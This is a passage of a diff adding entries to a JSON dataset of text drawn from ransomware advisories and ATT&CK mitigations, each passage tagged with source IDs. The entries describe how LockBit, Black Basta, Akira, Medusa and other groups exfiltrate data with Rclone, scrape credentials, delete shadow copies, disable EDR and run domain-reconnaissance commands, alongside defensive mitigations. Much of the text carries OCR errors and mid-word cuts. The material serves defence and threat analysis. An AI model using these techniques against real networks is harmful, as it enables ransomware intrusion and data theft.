+  },
+  {
+    "canonical": "attckrelease171techniqueinternaldefacementt1491001mitigationdatabackupmi053",
+    "text": "ATT&CK release: 17.1 Technique: Internal Defacement (T 1491.001) Mitigation: Data Backup (MI 053)",
+    "entries": [
+      "P017"
+    ],
+    "number": 59
+  },
+  {
+    "canonical": "considerimplementingitdisasterrecoveryplansthatcontainproceduresfortakingregulardatabackupsthatcanbeusedtorestoreorganizationaldatacitationreadygovitdrpensurebackupsarestoredoffsystemandisprotectedfromcommonmethodsadversariesmayusetogainaccessanddestroythebackupstopreventrecovery",
+    "text": "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.(Citation: Ready.gov IT DRP) Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.",
+    "entries": [
+      "P017"
+    ],
+    "number": 60
+  },
+  {
+    "canonical": "rcloneanopensourcecommandlinecloudstoragemanagertl567002",
+    "text": "rclone, an open-source command line cloud storage manager [Tl 567.002]",
+    "entries": [
+      "P017",
+      "P019",
+      "P039",
+      "P057",
+      "P063",
+      "P069"
+    ],
+    "number": 61
+  },
+  {
+    "canonical": "attckrelease171techniqueexfiltrationtocloudstoragetl567002mitigationrestrictwebbasedcontentmi021",
+    "text": "ATT&CK release: 17.1 Technique: Exfiltration to Cloud Storage (Tl 567.002) Mitigation: Restrict Web-Based Content (MI 021)",
+    "entries": [
+      "P017",
+      "P019",
+      "P039",
+      "P057",
+      "P063",
+      "P069"
+    ],
+    "number": 62
+  },
+  {
+    "canonical": "webproxiescanbeusedtoenforceanexternalnetworkcommunicationpolicythatpreventsuseofunauthorizedexternalservices",
+    "text": "Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.",
+    "entries": [
+      "P017",
+      "P019",
+      "P039",
+      "P057",
+      "P063",
+      "P069"
+    ],
+    "number": 63
+  },
+  {
+    "canonical": "fbiobservedbianliangroupactorsinstallrcloneandotherfilesingenericandtypicallyuncheckedfolderssuchasprogramdatavmwareandmusicfolders",
+    "text": "FBI observed BianLian group actors install Rclone and other files in generic and typically unchecked folders such as programdata\\vmware and music folders.",
+    "entries": [
+      "P019",
+      "P063",
+      "P069"
+    ],
+    "number": 64
+  },
+  {
+    "canonical": "bianliangroupusesfiletransferprotocolftpt1048andrcloneatoolusedtosyncfilestocloudstoragetoexfiltratedatatl537",
+    "text": "BianLian group uses File Transfer Protocol (FTP) [T 1048] and Rclone, a tool used to sync files to cloud storage, to exfiltrate data [Tl 537].",
+    "entries": [
+      "P019",
+      "P063",
+      "P069"
+    ],
+    "number": 65
+  },
+  {
+    "canonical": "attckrelease171techniquetransferdatatocloudaccounttl537mitigationuseraccountmanagementmi018",
+    "text": "ATT&CK release: 17.1 Technique: Transfer Data to Cloud Account (Tl 537) Mitigation: User Account Management (MI 018)",
+    "entries": [
+      "P019",
+      "P063",
+      "P069"
+    ],
+    "number": 66
+  },
+  {
+    "canonical": "limituseraccountandiampoliciestotheleastprivilegesrequired",
+    "text": "Limit user account and IAM policies to the least privileges required.",
+    "entries": [
+      "P019",
+      "P063",
+      "P069"
+    ],
+    "number": 67
+  },
+  {
+    "canonical": "lockbitaffiliatesuse1rcloneanopensourcecommandlinecloudstoragemanagerorfreefilesynctoexfiltrateand2megaapubliclyavailablefilesharingservicefordataexfiltration",
+    "text": "LockBit affiliates use (1) Rclone, an open-source command line cloud storage manager or FreeFileSync to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration.",
+    "entries": [
+      "P019"
+    ],
+    "number": 68
+  },
+  {
+    "canonical": "attckrelease171techniquetransferdatatocloudaccounttl537mitigationfilternetworktrafficmi037",
+    "text": "ATT&CK release: 17.1 Technique: Transfer Data to Cloud Account (Tl 537) Mitigation: Filter Network Traffic (MI 037)",
+    "entries": [
+      "P019",
+      "P063",
+      "P069"
+    ],
+    "number": 69
+  },
+  {
+    "canonical": "implementnetworkbasedfilteringrestrictionstoprohibitdatatransferstountrustedvpcs",
+    "text": "Implement network-based filtering restrictions to prohibit data transfers to untrusted VPCs.",
+    "entries": [
+      "P019",
+      "P063",
+      "P069"
+    ],
+    "number": 70
+  },
+  {
+    "canonical": "attckrelease171techniquetransferdatatocloudaccounttl537mitigationsoftwareconfigurationmi054",
+    "text": "ATT&CK release: 17.1 Technique: Transfer Data to Cloud Account (Tl 537) Mitigation: Software Configuration (MI 054)",
+    "entries": [
+      "P019",
+      "P063",
+      "P069"
+    ],
+    "number": 71
+  },
+  {
+    "canonical": "configureappropriatedatasharingrestrictionsincloudservicesforexampleexternalsharinginmicrosoftsharepointandgoogledrivecanbeturnedoffaltogetherblockedforcertaindomainsorrestrictedtocertainuserscitationgoogleworkspaceexternalsharingcitationmicrosoft365externalsharing",
+    "text": "Configure appropriate data sharing restrictions in cloud services. For example, external sharing in Microsoft SharePoint and Google Drive can be turned off altogether, blocked for certain domains, or restricted to certain users.(Citation: Google Workspace External Sharing) (Citation: Microsoft 365 External Sharing)",
+    "entries": [
+      "P019",
+      "P063",
+      "P069"
+    ],
+    "number": 72
+  },
+  {
+    "canonical": "lockbitaffiliatesusesoftperfectnetworkscanneradvancedipscanneroradvancedportscannertoscantargetnetworks",
+    "text": "LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.",
+    "entries": [
+      "P020",
+      "P029",
+      "P054",
+      "P060",
+      "P061"
+    ],
+    "number": 73
+  },
+  {
+    "canonical": "usenetworkservicediscoveryt1046lockbitaffiliatesusesoftperfectnetworkscanneradvancedipscanneroradvancedportscannertoscantargetnetworkslockbitaffiliatesmayusesoftperfectnetworkscanneradvancedportscannerandadfindtoenumerateconnectedmachinesinthenetworksysteminformationdiscoveryt1082lockbitaffiliateswillenumeratesysteminformationtoincludehostnamehostconfigurationdomaininformationlocaldriveconfigurationremotesharesandmountedexternalstoragedevicessystemlocationdiscoverysystemlanguagediscoveryt1614001lockbit30willnotinfectmachineswithlanguagesettingsthatmatchadefinedexclusionlisttable12lockbitaffiliatesattcktechniquesforenterpriselateralmovementtechniquetitleuselateralmovementta0008lockbitaffiliateswilllaterallymove",
+    "text": "Use Network Service Discovery T 1046 LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks. LockBit affiliates may use SoftPerfect Network Scanner, Advanced Port Scanner, and AdFind to enumerate connected machines in the network. System Information Discovery T 1082 LockBit affiliates will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices. System Location Discovery: System Language Discovery T 1614.001 LockBit 3.0 will not infect machines with language settings that match a defined exclusion list. Table 12: LockBit Affiliates' ATT&CK Techniques for Enterprise — Lateral Movement Technique Title Use Lateral Movement TA0008 LockBit affiliates will laterally move",
+    "entries": [
+      "P020",
+      "P079"
+    ],
+    "number": 74
+  },
+  {
+    "canonical": "9totable19forallreferencedthreatactortacticsandtechniquesinthisadvisoryforassistancewithmappingmaliciouscyberactivitytothemitreattckframeworkseecisaandmitreattcksbestpracticesformitreattckmappingandcisasdecidertooladditionalnotablettpshavebeenpublishedbythecheckpointincidentresponseteam10table9resourcedevelopmenttechniquetitleusedevelopcapabilitiest1587rhysidaactorshavebeenobserveddevelopingresourcesandcustomtoolsparticularlywithprogramnamessettorhysida01togainaccesstovictimsystemstable10initialaccesstechniquetitleusevalidaccountst1078rhysidaactorsareknowntousevalidcredentialstoaccessinternalvpnaccesspointsofvictimsupdateapril302025table11executionupdatenov132025accountdiscoverydomainaccountt1087002akirathreatactorsuseadfindexetoqueryandretrieveinformationfromactivedirectoryendupdatedomaintrustdiscoveryt1482akirathreatactorsusethenetwindowscommandtoenumeratedomaininformationupdatenov132025akirathreatactorsusenltestdomaintrustscommandstoenumeratedomaintrustsendupdatetable17lateralmovementtechniquetitleuseupdatenov132025remoteservices",
+    "text": "9 to Table 19 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK's Best Practices for MITRE ATT&CK Mapping and CISA's Decider Tool. Additional notable T TPs have been published by the Check Point Incident Response Team.[10] Table 9: Resource Development Technique Title Use Develop Capabilities T 1587 Rhysida actors have been observed developing resources and custom tools, particularly with program names set to \"Rhysida-0.1 \" to gain access to victim systems. Table 10: Initial Access Technique Title Use Valid Accounts T 1078 Rhysida actors are known to use valid credentials to access internal VPN access points of victims. Update April 30, 2025: Table 11: Execution Update Nov. 13, 2025 Account Discovery: Domain Account T 1087.002 Akira threat actors use Adfind.exe to query and retrieve information from Active Directory. End Update Domain Trust Discovery T 1482 Akira threat actors use the net Windows command to enumerate domain information. Update Nov. 13, 2025 Akira threat actors use nltest /DOMAIN TRUSTS commands to enumerate domain trusts. End Update Table 17. Lateral Movement Technique Title Use Update Nov. 13, 2025 Remote Services",
+    "entries": [
+      "P021"
+    ],
+    "number": 75
+  },
+  {
+    "canonical": "blackbastaaffiliateshavedeployedatoolcalledbackstabtodisableendpointdetectionandresponseedrtooling",
+    "text": "Black Basta affiliates have deployed a tool called Backstab to disable endpoint detection and response (EDR) tooling.",
+    "entries": [
+      "P023",
+      "P035",
+      "P075"
+    ],
+    "number": 76
+  },
+  {
+    "canonical": "table4blackbastaattcktechniquesfordefenseevasion",
+    "text": "Table 4: Black Basta ATT&CK Techniques for Defense Evasion",
+    "entries": [
+      "P023",
+      "P035",
+      "P075"
+    ],
+    "number": 77
+  },
+  {
+    "canonical": "1566004blackbastaaffiliateshaveusedspearphishingphoneandmicrosoftteamscallstotrickusersintoprovidinginitialaccessexploitpublicfacingapplicationtl190blackbastaaffiliateshaveexploitedconnectwisevulnerabilitycve20241709toobtaininitialaccesstable3blackbastaattcktechniquesforprivilegeescalationtechniquetitleuseexploitationforprivilegeescalationt1068blackbastaaffiliateshaveusedcredentialscrapingtoolslikemimikatzzerologonnopacandprintnightmareforprivilegeescalationtable4blackbastaattcktechniquesfordefenseevasiontechniquetitleusemasqueradingt1036blackbastaaffiliateshaveconductedreconnaissanceusingutilitieswithinnocuousfilenamessuchasintelordelltoevadedetectionimpairdefensesdisableormodifytoolstl562001blackbastaaffiliateshavedeployedatoolcalledbacksta",
+    "text": "1566.004 Black Basta affiliates have used spearphishing phone and Microsoft Teams calls to trick users into providing initial access. Exploit Public-Facing Application Tl 190 Black Basta affiliates have exploited ConnectWise vulnerability CVE-2024-1709 to obtain initial access. Table 3: Black Basta ATT&CK Techniques for Privilege Escalation Technique Title Use Exploitation for Privilege Escalation T 1068 Black Basta affiliates have used credential scraping tools like Mimikatz, Zerologon, NoPac and PrintNightmare for privilege escalation. Table 4: Black Basta ATT&CK Techniques for Defense Evasion Technique Title Use Masquerading T 1036 Black Basta affiliates have conducted reconnaissance using utilities with innocuous file names, such as Intel or Dell, to evade detection. Impair Defenses: Disable or Modify Tools Tl 562.001 Black Basta affiliates have deployed a tool called Backsta",
+    "entries": [
+      "P023",
+      "P025",
+      "P075"
+    ],
+    "number": 78
+  },
+  {
+    "canonical": "table2blackbastaattcktechniquesforinitialaccess",
+    "text": "Table 2: Black Basta ATT&CK Techniques for Initial Access",
+    "entries": [
+      "P023",
+      "P025",
+      "P075"
+    ],
+    "number": 79
+  },
+  {
+    "canonical": "attcktechniquesforimpacttechniquetitleuseinhibitsystemrecoveryt1490blackbastaaffiliateshaveusedthevssadminexeprogramtodeleteshadowcopiesdataencryptedforimpactt1486blackbastaaffiliateshaveusedapublickeytofullyencryptfilesindicatorsofcompromiseupdatenovember82024manyindicatorsprovidedinthisadvisorysinitialpublicationhavebeenremovedconsideringtheyareoutdatedforhistoricreferenceseeaa24131astopransomwareblackbastainitialversiontheiocslistedintables78wereobtainedfromtrustedthirdpartyreportingandareconsideredmostcurrentdisclaimertheauthoringorganizationsrecommendnetworkdefendersinvestigateorvetipaddressespriortotakingactionsuchasblockingasmanycyberactorsareknowntochangeipaddressessometimesdailyandsomeipaddressesmayhostvaliddomains",
+    "text": "ATT&CK Techniques for Impact Technique Title Use Inhibit System Recovery T 1490 Black Basta affiliates have used the vssadmin.exe program to delete shadow copies. Data Encrypted for Impact T 1486 Black Basta affiliates have used a public key to fully encrypt files. Indicators of Compromise Update November 8, 2024: Many indicators provided in this advisory's initial publication have been removed considering they are outdated. For historic reference, see AA24-131A #StopRansomware: Black Basta (Initial Version). The IOCs listed in Tables 7—8 were obtained from trusted third-party reporting and are considered most current. Disclaimer: The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.",
+    "entries": [
+      "P023",
+      "P025",
+      "P075"
+    ],
+    "number": 80
+  },
+  {
+    "canonical": "9totable19forallreferencedthreatactortacticsandtechniquesinthisadvisoryforassistancewithmappingmaliciouscyberactivitytothemitreattckframeworkseecisaandmitreattcksbestpracticesformitreattckmappingandcisasdecidertooladditionalnotablettpshavebeenpublishedbythecheckpointincidentresponseteam10table9resourcedevelopmenttechniquetitleusedevelopcapabilitiest1587rhysidaactorshavebeenobserveddevelopingresourcesandcustomtoolsparticularlywithprogramnamessettorhysida01togainaccesstovictimsystemstable10initialaccesstechniquetitleusevalidaccountst1078rhysidaactorsareknowntousevalidcredentialstoaccessinternalvpnaccesspointsofvictimsupdateapril302025table11executiontechniquetitleusecommandandscriptinginterpretercloudapit1059009rhysidaactorsleverageazcopyacommandlineutilitythat",
+    "text": "9 to Table 19 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK's Best Practices for MITRE ATT&CK Mapping and CISA's Decider Tool. Additional notable T TPs have been published by the Check Point Incident Response Team.[10] Table 9: Resource Development Technique Title Use Develop Capabilities T 1587 Rhysida actors have been observed developing resources and custom tools, particularly with program names set to \"Rhysida-0.1 \" to gain access to victim systems. Table 10: Initial Access Technique Title Use Valid Accounts T 1078 Rhysida actors are known to use valid credentials to access internal VPN access points of victims. Update April 30, 2025: Table 11: Execution Technique Title Use Command and Scripting Interpreter: Cloud API T 1059.009 Rhysida actors leverage AZCopy, a command-line utility that",
+    "entries": [
+      "P024",
+      "P032",
+      "P033",
+      "P043",
+      "P047",
+      "P053",
+      "P055",
+      "P056",
+      "P068",
+      "P073"
+    ],
+    "number": 81
+  },
+  {
+    "canonical": "002akirathreatactorsusethenetgroupdomaincommandtofinddomainlevelgroupsandpermissionsettingssysteminformationdiscoveryt1082akirathreatactorsusetoolslikepchunter64toacquiredetailedprocessandsysteminformationupdatenov132025akirathreatactorsusediskchecksoftwaretoqueryremotesystemsforinformationondiskdrivesandinstalledsoftwareendupdateupdatenov132025accountdiscoverydomainaccountt1087002akirathreatactorsuseadfindexetoqueryandretrieveinformationfromactivedirectoryendupdatedomaintrustdiscoveryt1482akirathreatactorsusethenetwindowscommandtoenumeratedomaininformationupdatenov132025akirathreatactorsusenltestdomaintrustscommandstoenumeratedomaintrustsendupdatetable17lateralmovementtechniquetitleuseupdatenov132025remoteservices",
+    "text": "002 Akira threat actors use the net group /domain command to find domain level groups and permission settings. System Information Discovery T 1082 Akira threat actors use tools like PCHunter64 to acquire detailed process and system information. Update Nov. 13, 2025 Akira threat actors use DiskCheck software to query remote systems for information on disk drives and installed software. End Update Update Nov. 13, 2025 Account Discovery: Domain Account T 1087.002 Akira threat actors use Adfind.exe to query and retrieve information from Active Directory. End Update Domain Trust Discovery T 1482 Akira threat actors use the net Windows command to enumerate domain information. Update Nov. 13, 2025 Akira threat actors use nltest /DOMAIN TRUSTS commands to enumerate domain trusts. End Update Table 17. Lateral Movement Technique Title Use Update Nov. 13, 2025 Remote Services",
+    "entries": [
+      "P024",
+      "P033",
+      "P043",
+      "P047",
+      "P053",
+      "P055",
+      "P068",
+      "P073"
+    ],
+    "number": 82
+  },
+  {
+    "canonical": "notethisadvisoryusesthemitreattckforenterpriseframeworkversion16seethemitreattcktacticsandtechniquessectionforatableofthethreatactorsactivitymappedtomitreattcktacticsandtechniquesforassistancewithmappingmaliciouscyberactivitytothemitreattckframeworkseecisaandmitreattcksbestpracticesformitreattckmappingandcisasdecidertoolinitialaccessblackbastaaffiliatesprimarilyusespearphishingtl566toobtaininitialaccessaccordingtocybersecurityresearchersaffiliateshavealsousedqakbotduringinitialaccesslstartinginfebruary2024blackbastaaffiliatesbeganexploitingconnectwisevulnerabilitycve20241709cwe288tl190insomeinstancesaffiliateshavebeenobservedabusingvalidcredentialst1078updatenovember82024inmay2024blackbastaaffiliateslaunchedasocialengineeringcampaigninwhichtargetedusersweresentalarge",
+    "text": "Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 16. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors' activity mapped to MITRE ATT&CK@ tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK's Best Practices for MITRE ATT&CK Mapping and CISA's Decider Tool. Initial Access Black Basta affiliates primarily use spearphishing [Tl 566] to obtain initial access. According to cybersecurity researchers, affiliates have also used Qakbot during initial access.[l] Starting in February 2024, Black Basta affiliates began exploiting ConnectWise vulnerability CVE- 2024-1709 [CWE-288] [Tl 190]. In some instances, affiliates have been observed abusing valid credentials [T 1078]. Update November 8, 2024: In May 2024, Black Basta affiliates launched a social engineering campaign in which targeted users were sent a large",
+    "entries": [
+      "P025"
+    ],
+    "number": 83
+  },
+  {
+    "canonical": "usenetworkintrusiondetectionpreventionsystemstodetectandpreventremoteservicescans",
+    "text": "Use network intrusion detection/prevention systems to detect and prevent remote service scans.",
+    "entries": [
+      "P029",
+      "P034",
+      "P058",
+      "P078",
+      "P079"
+    ],
+    "number": 84
+  },
+  {
+    "canonical": "attckrelease171techniquenetworkservicediscoveryt1046mitigationnetworkintrusionpreventionm1031",
+    "text": "ATT&CK release: 17.1 Technique: Network Service Discovery (T 1046) Mitigation: Network Intrusion Prevention (M 1031)",
+    "entries": [
+      "P029",
+      "P034",
+      "P058",
+      "P078",
+      "P079"
+    ],
+    "number": 85
+  },
+  {
+    "canonical": "lockbitaffiliatesusestealbitacustomexfiltrationtoolfirstusedwithlockbit20tostealdatafromatargetnetwork",
+    "text": "LockBit affiliates use StealBit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network.",
+    "entries": [
+      "P029"
+    ],
+    "number": 86
+  },
+  {
+    "canonical": "threatintelligencehelpsdefendersandusersbeawareofanddefendagainstcommonluresandactivecampaignsthathavebeenusedforimpersonation",
+    "text": "Threat intelligence helps defenders and users be aware of and defend against common lures and active campaigns that have been used for impersonation.",
+    "entries": [
+      "P032",
+      "P040",
+      "P041",
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 87
+  },
+  {
+    "canonical": "attckrelease171techniqueimpersonationtl656mitigationthreatintelligenceprogramm1019",
+    "text": "ATT&CK release: 17.1 Technique: Impersonation (Tl 656) Mitigation: Threat Intelligence Program (M 1019)",
+    "entries": [
+      "P032",
+      "P040",
+      "P041",
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 88
+  },
+  {
+    "canonical": "userscanbetrainedtoidentifysocialengineeringtechniquesandspearphishingemails",
+    "text": "Users can be trained to identify social engineering techniques and spearphishing emails.",
+    "entries": [
+      "P032",
+      "P040",
+      "P041",
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 89
+  },
+  {
+    "canonical": "attckrelease171techniquespearphishingattachmenttl566001mitigationusertrainingmi017",
+    "text": "ATT&CK release: 17.1 Technique: Spearphishing Attachment (Tl 566.001) Mitigation: User Training (MI 017)",
+    "entries": [
+      "P032",
+      "P040",
+      "P041",
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 90
+  },
+  {
+    "canonical": "useusertrainingasawaytobringawarenesstocommonphishingandspearphishingtechniquesandhowtoraisesuspicionforpotentiallymaliciousevents",
+    "text": "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
+    "entries": [
+      "P032",
+      "P040",
+      "P041",
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 91
+  },
+  {
+    "canonical": "attckrelease171techniqueuserexecutiont1204mitigationusertrainingmi017",
+    "text": "ATT&CK release: 17.1 Technique: User Execution (T 1204) Mitigation: User Training (MI 017)",
+    "entries": [
+      "P032",
+      "P040",
+      "P041",
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 92
+  },
+  {
+    "canonical": "lockbit30attemptstospreadacrossavictimnetworkbyusingapreconfiguredlistofcredentialshardcodedatcompilationtimeoracompromisedlocalaccountwithelevatedprivilegest1078",
+    "text": "LockBit 3.0 attempts to spread across a victim network by using a preconfigured list of credentials hardcoded at compilation time or a compromised local account with elevated privileges [T 1078].",
+    "entries": [
+      "P039",
+      "P057"
+    ],
+    "number": 93
+  },
+  {
+    "canonical": "attckrelease171techniquevalidaccountstl078mitigationapplicationdeveloperguidancem1013",
+    "text": "ATT&CK release: 17.1 Technique: Valid Accounts (Tl 078) Mitigation: Application Developer Guidance (M 101 3)",
+    "entries": [
+      "P039",
+      "P057"
+    ],
+    "number": 94
+  },
+  {
+    "canonical": "ensurethatapplicationsdonotstoresensitivedataorcredentialsinsecurelyegplaintextcredentialsincodepublishedcredentialsinrepositoriesorcredentialsinpubliccloudstorage",
+    "text": "Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage).",
+    "entries": [
+      "P039",
+      "P057"
+    ],
+    "number": 95
+  },
+  {
+    "canonical": "attckrelease171techniquevalidaccountstl078mitigationactivedirectoryconfigurationm1015",
+    "text": "ATT&CK release: 17.1 Technique: Valid Accounts (Tl 078) Mitigation: Active Directory Configuration (M 101 5)",
+    "entries": [
+      "P039",
+      "P057"
+    ],
+    "number": 96
+  },
+  {
+    "canonical": "disablelegacyauthenticationwhichdoesnotsupportmfaandrequiretheuseofmodernauthenticationprotocolsinstead",
+    "text": "Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead.",
+    "entries": [
+      "P039",
+      "P057"
+    ],
+    "number": 97
+  },
+  {
+    "canonical": "historicallyroyalactorswereobservedleveragingchiselsecureshellsshclientputtyopensshandmobaxtermtl572",
+    "text": "Historically, Royal actors were observed leveraging Chisel, Secure Shell (SSH) client, PuTTY, OpenSSH, and MobaXterm [Tl 572]",
+    "entries": [
+      "P040",
+      "P041",
+      "P070"
+    ],
+    "number": 98
+  },
+  {
+    "canonical": "stopransomwareblacksuitroyalransomware",
+    "text": "#StopRansomware: Blacksuit (Royal) Ransomware",
+    "entries": [
+      "P040",
+      "P041",
+      "P070"
+    ],
+    "number": 99
+  },
+  {
+    "canonical": "attckrelease171techniqueprotocoltunnelingtl572mitigationnetworkintrusionpreventionm1031",
+    "text": "ATT&CK release: 17.1 Technique: Protocol Tunneling (Tl 572) Mitigation: Network Intrusion Prevention (M 1031)",
+    "entries": [
+      "P040",
+      "P041",
+      "P062",
+      "P070",
+      "P074",
+      "P080"
+    ],
+    "number": 100
+  },
+  {
+    "canonical": "networkintrusiondetectionandpreventionsystemsthatusenetworksignaturestoidentifytrafficforspecificadversarymalwarecanbeusedtomitigateactivityatthenetworklevel",
+    "text": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.",
+    "entries": [
+      "P040",
+      "P041",
+      "P062",
+      "P070",
+      "P074",
+      "P080"
+    ],
+    "number": 101
+  },
+  {
+    "canonical": "userscanbetrainedtoidentifysocialengineeringtechniquesandspearphishingattempts",
+    "text": "Users can be trained to identify social engineering techniques and spearphishing attempts.",
+    "entries": [
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 102
+  },
+  {
+    "canonical": "attckrelease171techniquephishingforinformationtl598mitigationusertrainingmi017",
+    "text": "ATT&CK release: 17.1 Technique: Phishing for Information (Tl 598) Mitigation: User Training (MI 017)",
+    "entries": [
+      "P044",
+      "P049",
+      "P072"
+    ],
+    "number": 103
+  },
+  {
+    "canonical": "002toabusethefunctionsofdomaincontrollersinsomeinstancestheauthoringorganizationsidentifiedakirathreatactorscreatinganadministrativeaccountnameditadmaccordingtotheauthoringorganizationsandopensourcereportingakirathreatactorsleveragepostexploitationtechniquessuchaskerberoasting8toextractcredentialsstoredintheprocessmemoryofthelocalsecurityauthoritysubsystemservicelsass9tl003001akirathreatactorsalsousecredentialscrapingtoolst1003likemimikatzandlazagnetoaidinprivilegeescalationfornetworkdiscoveryandreconnaissanceactorsusetoolslikesoftperfectadvancedipscannerandnetscant1016netwindowscommandst1059003areusedtoidentifydomaincontrollerst1018andgatherinformationondomaintrustrelationshipst1482",
+    "text": ".002] to abuse the functions of domain controllers. In some instances, the authoring organizations identified Akira threat actors creating an administrative account named itadm. According to the authoring organizations and open source reporting, Akira threat actors leverage post-exploitation techniques, such as Kerberoasting,8 to extract credentials stored in the process memory of the Local Security Authority Subsystem Service (LSASS)9 [Tl 003.001]. Akira threat actors also use credential scraping tools [T 1003], like Mimikatz and LaZagne, to aid in privilege escalation. For network discovery and reconnaissance, actors use tools like SoftPerfect, Advanced IP Scanner, and NetScan [T 1016]. net Windows commands [T 1059.003] are used to identify domain controllers [T 1018] and gather information on domain trust relationships [T 1482].",
+    "entries": [
+      "P055",
+      "P068"
+    ],
+    "number": 104
+  },
+  {
+    "canonical": "bianliangroupactorsusedrclonetoexfiltratedatatoacloudaccounttheycontrolonthesameservicetoavoidtypicalfiletransfersdownloadsandnetworkbasedexfiltrationdetection",
+    "text": "BianLian group actors used Rclone to exfiltrate data to a cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.",
+    "entries": [
+      "P056",
+      "P063",
+      "P069"
+    ],
+    "number": 105
+  },
+  {
+    "canonical": "6medusaactorsobfuscatercloneexeandassociatedrcloneconffilesbyrenamingthefilesforexampletolspexeandngconftxtmedusaactorsexfiltratesmallbatchesoffilesforexamplecredentialfilesorregistryhivesusingrdpclipexerdpsbuiltinfiletransfermechanismtheactorsusesysinternalspsexecpdqinventorydeployorbigfixt1072todeploytheencryptorgazeexeonfilesacrossthenetworkwiththeactorsdisablingwindowsdefenderandotherantivirusservicesonspecifictargetsupdatedaug182026medusaactorsuseacustompdqdeployplaybookto",
+    "text": "6) Medusa actors obfuscate rclone.exe and associated rclone.conf files by renaming the files (for example, to lsp.exe and ngconf.txt). Medusa actors exfiltrate small batches of files—for example, credential files or registry hives—using rdpclip.exe, RDP's built-in file transfer mechanism. The actors use Sysinternals PsExec, PDQ Inventory/Deploy, or BigFix [T 1072] to deploy the encryptor, gaze.exe, on files across the network—with the actors disabling Windows Defender and other antivirus services on specific targets. (Updated Aug. 18, 2026) Medusa actors use a custom PDQ Deploy playbook to:",
+    "entries": [
+      "P056"
+    ],
+    "number": 106
+  },
+  {
+    "canonical": "theauthoringorganizationsobservedakirathreatactorsestablishingcommandandcontrolc2communicationsbyusingtunnelingutilitiessuchasngroktl572",
+    "text": "The authoring organizations observed Akira threat actors establishing command and control (C2) communications by using tunneling utilities, such as Ngrok [Tl 572]",
+    "entries": [
+      "P062",
+      "P074",
+      "P080"
+    ],
+    "number": 107
+  },
+  {
+    "canonical": "insomeinstancesakirathreatactorsusengroktocreatesecuretunnelsfordataexfiltrationt1090",
+    "text": "In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].",
+    "entries": [
+      "P062",
+      "P074",
+      "P080"
+    ],
+    "number": 108
+  },
+  {
+    "canonical": "tofurtherinhibitsystemrecoveryandimpedeforensicanalysisakirasencryptorwexeusespowershellcommandstodeletevolumeshadowcopyservicevsscopiesonwindowssystemst1490",
+    "text": "To further inhibit system recovery and impede forensic analysis, Akira's encryptor (w.exe) uses PowerShell commands to delete Volume Shadow Copy Service (VSS) copies on Windows systems [T 1490].",
+    "entries": [
+      "P062",
+      "P074",
+      "P080"
+    ],
+    "number": 109
+  },
+  {
+    "canonical": "attckrelease171techniqueinhibitsystemrecoveryt1490mitigationuseraccountmanagementmi018",
+    "text": "ATT&CK release: 17.1 Technique: Inhibit System Recovery (T 1490) Mitigation: User Account Management (MI 018)",
+    "entries": [
+      "P062",
+      "P080"
+    ],
+    "number": 110
+  },
+  {
+    "canonical": "limittheuseraccountsthathaveaccesstobackupstoonlythoserequiredinawsenvironmentsconsiderusingservicecontrolpoliciestorestrictapicallstodeletebackupssnapshotsandimages",
+    "text": "Limit the user accounts that have access to backups to only those required. In AWS environments, consider using Service Control Policies to restrict API calls to delete backups, snapshots, and images.",
+    "entries": [
+      "P062",
+      "P080"
+    ],
+    "number": 111
+  },
+  {
+    "canonical": "attckrelease171techniqueinhibitsystemrecoveryt1490mitigationoperatingsystemconfigurationmi028",
+    "text": "ATT&CK release: 17.1 Technique: Inhibit System Recovery (T 1490) Mitigation: Operating System Configuration (MI 028)",
+    "entries": [
+      "P062",
+      "P074"
+    ],
+    "number": 112
+  },
+  {
+    "canonical": "considertechnicalcontrolstopreventthedisablingofservicesordeletionoffilesinvolvedinsystemrecoveryadditionallyensurethatwinreisenabledusingthefollowingcommandreagentcenablecodecitationreagentccmd",
+    "text": "Consider technical controls to prevent the disabling of services or deletion of files involved in system recovery. Additionally, ensure that WinRE is enabled using the following command: reagentc /enable</code>.(Citation: reagentc_cmd)",
+    "entries": [
+      "P062"
+    ],
+    "number": 113
+  },
+  {
+    "canonical": "attckrelease171techniqueinhibitsystemrecoveryt1490mitigationexecutionpreventionmi038",
+    "text": "ATT&CK release: 17.1 Technique: Inhibit System Recovery (T 1490) Mitigation: Execution Prevention (MI 038)",
+    "entries": [
+      "P062"
+    ],
+    "number": 114
+  },
+  {
+    "canonical": "considerusingapplicationcontrolconfiguredtoblockexecutionofutilitiessuchasdiskshadowexethatmaynotberequiredforagivensystemornetworktopreventpotentialmisusebyadversaries",
